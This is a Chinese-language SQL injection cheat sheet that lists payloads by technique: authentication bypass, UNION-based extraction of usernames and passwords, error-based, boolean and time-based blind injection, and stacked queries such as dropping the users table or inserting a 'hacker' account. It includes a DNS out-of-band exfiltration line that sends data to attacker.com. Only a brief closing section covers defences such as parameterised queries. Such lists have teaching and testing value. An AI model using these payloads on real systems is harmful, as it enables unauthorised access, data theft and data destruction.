SQL 注入的核心本质在于**混淆了“控制指令”与“数据”**，攻击者通过输入特殊闭合字符（如 `'`、`"`、`\`) 和 SQL 语法结构来篡改原有的数据库查询逻辑。

常见的 SQL 注入指令和技术模式主要分为以下几类：

---

**1. 经典认证绕过（Authentication Bypass）**
用于在登录界面绕过密码校验直接获取特权访问：

* `' OR 1=1 --` 或 `' OR '1'='1' --`：利用恒真条件使 `WHERE` 子句永远成立，并将后续的密码检查注释掉。


* `admin' --` 或 `admin' #`：指定管理员用户名并注释掉后续密码验证逻辑。


* `' OR 1=1#`：在 MySQL 中使用 `#` 作为注释符。
* `' OR 1=1/*`：使用多行注释符闭合后续 SQL 语句。

**2. 联合查询注入（UNION-Based Injection）**
在页面有正常数据回显时，通过 `UNION` 拼接并执行攻击者的自定义查询：

* **确定字段数量**：`' ORDER BY 1--`、`' ORDER BY 2--`（逐步递增直到报错）。
* **提取当前数据库与版本信息**：
* MySQL/PostgreSQL：`' UNION SELECT 1, version(), database() --`
* Oracle：`' UNION SELECT null, banner FROM v$version --`
* MSSQL：`' UNION SELECT 1, @@version, db_name() --`


* **跨表拖库提取敏感数据**：
* `' UNION SELECT 1, table_name FROM information_schema.tables --`
* `' UNION SELECT username, password FROM users --`



**3. 报错注入（Error-Based Injection）**
在页面没有正常数据回显，但会打印数据库错误详情时，利用特定函数报错将查询结果带出：

* **MySQL `updatexml` 报错**：
`' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1) --`
* **MySQL `extractvalue` 报错**：
`' AND extractvalue(1, concat('~', (SELECT database()))) --`

**4. 盲注（Blind SQL Injection）**
在页面完全不回显数据也不报错时使用：

* **布尔盲注（Boolean-Based）**：根据页面返回的内容差异逐字符推测数据：
* `' AND (SELECT SUBSTRING(version(), 1, 1)) = '5' --`
* `' AND ASCII(SUBSTR((SELECT database()), 1, 1)) > 100 --`


* **时间盲注（Time-Based）**：利用休眠函数根据响应延迟判断真假：
* MySQL：`' AND IF(1=1, SLEEP(5), 0) --`
* PostgreSQL：`' || pg_sleep(5) --`
* MSSQL：`'; WAITFOR DELAY '0:0:5' --`



**5. 堆叠查询与带外攻击（Stacked Queries & Out-of-Band）**
在支持多语句执行的环境下（如 PHP + PDO/MSSQL）：

* **堆叠执行修改/破坏**：
* `'; DROP TABLE users; --`
* `'; INSERT INTO users (username, password) VALUES ('hacker', '123456'); --`


* **带外注入（OOB / DNS Exfiltration）**：利用数据库网络请求函数通过 DNS 解析带出数据：
* MySQL：`' AND LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\a')) --`



---

**核心防御方案**

* **参数化查询（Prepared Statements）**：强制将用户输入严格作为“数据”处理，彻底杜绝输入被解析为 SQL 控制指令。


* **输入白名单验证与最小权限原则**：限制数据库账户的读写权限，关闭多语句执行与危险函数访问。